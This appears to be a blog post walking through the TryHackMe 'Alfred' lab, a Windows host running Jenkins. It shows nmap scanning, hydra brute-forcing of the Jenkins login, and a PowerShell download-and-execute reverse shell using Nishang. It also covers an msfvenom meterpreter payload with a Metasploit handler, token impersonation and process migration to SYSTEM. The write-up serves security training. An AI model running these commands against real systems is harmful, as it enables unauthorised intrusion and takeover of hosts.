<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Alfred" /><meta property="og:locale" content="en_US" /><meta name="description" content="Click here if you’re interested in the room!" /><meta property="og:description" content="Click here if you’re interested in the room!" /><link rel="canonical" href="https://eddyspaghette.github.io/posts/Alfred/" /><meta property="og:url" content="https://eddyspaghette.github.io/posts/Alfred/" /><meta property="og:site_name" content="Edward Zhou" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-16T01:44:44-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Alfred" /><meta name="twitter:site" content="@eddylongevity" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Click here if you’re interested in the room!","headline":"Alfred","url":"https://eddyspaghette.github.io/posts/Alfred/","@type":"BlogPosting","dateModified":"2021-06-16T05:33:38-07:00","datePublished":"2021-06-16T01:44:44-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://eddyspaghette.github.io/posts/Alfred/"},"@context":"https://schema.org"}</script><title>Alfred | Edward Zhou</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Edward Zhou"><meta name="application-name" content="Edward Zhou"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://freesvg.org/img/Linux-Avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Edward Zhou</a></div><div class="site-subtitle font-italic">Curated writeups of TryHackMe, HackTheBox and CTFs.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/eddyspaghette" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/eddylongevity" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ejz2','sfu.ca'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Alfred</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Alfred</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Edward Zhou </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 16, 2021, 1:44 AM -0700" prep="on" > Jun 16 <i class="unloaded">2021-06-16T01:44:44-07:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 16, 2021, 5:33 AM -0700" prefix="Updated " > Jun 16 <i class="unloaded">2021-06-16T05:33:38-07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="766 words">4 min</span></div></div><div class="post-content"><h2 id="click-here-if-youre-interested-in-the-room"><a href="https://tryhackme.com/room/alfred">Click here if you’re interested in the room!</a></h2><p><strong>This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this!</strong></p><ol><li><a href="#1">How many TCP ports are open?</a><li><a href="#2">What is the username and password for the log in panel?</a><li><a href="#3">Find a feature of the tool that allows you to execute commands on the underlying system.</a><li><a href="#4">What is the user.txt flag?</a><li><a href="#5">Switching shells</a><li><a href="#6">Size of the payload</a><li><a href="#7">Token Impersonation</a><li><a href="#8">Output of guid command</a><li><a href="#9">Migrating and finding root.txt</a></ol><p><a name="1"></a></p><h2 id="1-the-first-question-asks-for-the-number-of-tcp-ports-open-we-can-use-a-nmap-scan-for-this">1) The first question asks for the number of TCP ports open, we can use a nmap scan for this.</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-vv</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> nmap.log <span class="o">{</span>target_ip_here<span class="o">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png" alt="image" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png" alt="image" /></p><p><a name="2"></a></p><h2 id="2-what-is-the-username-and-password-for-the-log-in-panelin-the-format-usernamepassword">2) What is the username and password for the log in panel(in the format username:password)</h2><p>Seems like port 8080 is open so lets navigate to that. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png" alt="image" /></p><p>Navigating to the target ip at port 8080 brings us to a login page for [Jenkins] <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png" alt="image" /></p><p>Viewing the page source doesn’t seem to give any hidden credentials, so we will need to be bruteforcing credentials.</p><p>I will be using hydra for this.</p><p>First, I’ll be using BurpSuite to intercept the login request. We can see that it is a http post request along with the required parameters circled in red. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png" alt="image" /></p><p>It seems like both the username and pass are 5 words long, I’ll be using hydra to bruteforce credentials. I will be making a copy of a username text file and a password textfile that are only five characters long from seclists. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png" alt="image" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png" alt="image" /></p><p>using hydra to bruteforce credentials</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-L</span> five_c_user.txt <span class="nt">-P</span> five_c_pass.txt <span class="nt">-s</span> 8080 <span class="o">{</span>target_ip<span class="o">}</span> http-post-form <span class="s2">"j/acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password
</span></pre></table></code></div></div><p><strong>Success we can now login with our new credentials!</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png" alt="image" /></p><p><a name="3"></a></p><h2 id="3-find-a-feature-of-the-tool-that-allows-you-to-execute-commands-on-the-underlying-system">3) Find a feature of the tool that allows you to execute commands on the underlying system.</h2><p>Peering around the website we go into the project -&gt; configure -&gt; build and we are presented with something that looks like a CLI. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png" alt="image" /></p><p>If we save and build the project again, we can see the whoami command is invoked in the latest build. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png" alt="image" /></p><p>Seems like we can gain access to the machine using a reverse shell.</p><p>Let’s grab Nishang’s TCP reverse shell script</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
</pre></table></code></div></div><p>Next, we’ll need to host a http.server so the server can download the powershell file. (default port 8000)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server
</pre></table></code></div></div><p>We will also need to open a netcat listener for the reverse shell, I will be using a wrapper called rlwrap along with nc to do this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rlwrap nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>Run the powerline command in the room. The first download port should be the http.server port (8000) and the other port should be the nc reverse shell listener port (4444 in my case) Then click build now.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">powershell</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://your-ip:your-port/Invoke-PowerShellTcp.ps1'</span><span class="p">);</span><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">your-ip</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">your-port</span><span class="w">
</span></pre></table></code></div></div><p><a name="4"></a></p><h2 id="4-what-is-the-usertxt-flag">4) What is the user.txt flag?</h2><p>We should be connected to our reverse shell after invoking the build. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png" alt="image" /></p><p>We’re looking for a user.txt file, so lets run the equivalent find command in powershell</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">user.txt</span><span class="o">*</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></pre></table></code></div></div><p>Seems like we got a match!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png" alt="image" /></p><p>Success!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png" alt="image" /></p><p><a name="5"></a></p><h2 id="5-switching-shells">5) Switching shells</h2><p>Using nc for a reverse shell is usually unstable or very buggy so using Metasploit to gain a meterpreter shell will give us a more full-fleshed shell experience.</p><p>Use msfvenom to generate a payload for the windows reverse shell (Im naming it as hello.exe):</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nt">-a</span> x86 <span class="nt">--encoder</span> x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=[</span>IP] <span class="nv">LPORT</span><span class="o">=[</span>PORT] <span class="nt">-f</span> exe <span class="nt">-o</span> hello.exe
</pre></table></code></div></div><p>Host a python server on your local machine:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span>
</pre></table></code></div></div><p>Use the following command on our netcat reverse shell:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w">  </span><span class="n">powershell</span><span class="w"> </span><span class="s2">"(New-Object System.Net.WebClient).Downloadfile('http://&lt;ip&gt;:8000/hello.exe','hello.exe')"</span><span class="w">
</span></pre></table></code></div></div><p>Seems like the powershell command successfully downloaded our payload. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png" alt="image" /></p><p>Now we have to setup our handler in Metasploit</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST your-ip
  set LPORT listening-port
  run
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png" alt="image" /></p><p>Finally we are ready to execute the program. Enter this command in the powershell:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w">  </span><span class="n">Start-Process</span><span class="w"> </span><span class="s2">"hello.exe"</span><span class="w">
</span></pre></table></code></div></div><p>Sucessfully connected.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png" alt="image" /></p><p><a name="6"></a></p><h2 id="6-what-is-the-size-of-the-payload">6) What is the size of the payload</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png" alt="image" /></p><p><a name="7"></a></p><h2 id="7-token-impersonation">7) Token Impersonation</h2><p>Now that we’re in the meterpreter shell, lets switch to powershell before executing the following commands.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="w">  </span><span class="n">use</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
  </span><span class="n">powershell_shell</span><span class="w">
  </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
</span></pre></table></code></div></div><p>We can use the incognito module to exploit these two privileges. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png" alt="image" /></p><p>Exit out of powershell and execute in the meterpreter shell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png" alt="image" /></p><p>List all tokens then impersonate the Administrators token.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  list_tokens -g
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png" alt="image" /></p><p><a name="8"></a></p><h2 id="8-output-of-guid">8) Output of guid</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png" alt="image" /></p><p><a name="9"></a></p><h2 id="9-migrating-and-finding-roottxt">9) Migrating and finding root.txt</h2><p>Use the command ps and find the PID of services.exe in red</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png" alt="image" /></p><p>Migrate to services.exe</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png" alt="image" /></p><p>Find root.txt and the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png" alt="image" /></p><h3 id="congratulations-the-room-is-now-complete-hopefully-this-guide-was-helpful-for-anyone-stuck-in-this-room">Congratulations, the room is now complete! Hopefully, this guide was helpful for anyone stuck in this room.</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Alfred - Edward Zhou&url=https://eddyspaghette.github.io/posts/Alfred/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Alfred - Edward Zhou&u=https://eddyspaghette.github.io/posts/Alfred/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Alfred - Edward Zhou&url=https://eddyspaghette.github.io/posts/Alfred/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GameZone/">Game Zone</a><li><a href="/posts/HackPark/">HackPark</a><li><a href="/posts/Alfred/">Alfred</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackPark/"><div class="card-body"> <span class="timeago small" > Jun 18 <i class="unloaded">2021-06-18T01:06:03-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackPark</h3><div class="text-muted small"><p> Click here if you’re interested in the room! This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this! What’s the name of the clown displ...</p></div></div></a></div><div class="card"> <a href="/posts/GameZone/"><div class="card-body"> <span class="timeago small" > Jun 24 <i class="unloaded">2021-06-24T13:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Game Zone</h3><div class="text-muted small"><p> Click here if you’re interested in the room! This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this! What is the name of the large cart...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/HackPark/" class="btn btn-outline-primary" prompt="Newer"><p>HackPark</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/eddylongevity">Edward Zhou</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" 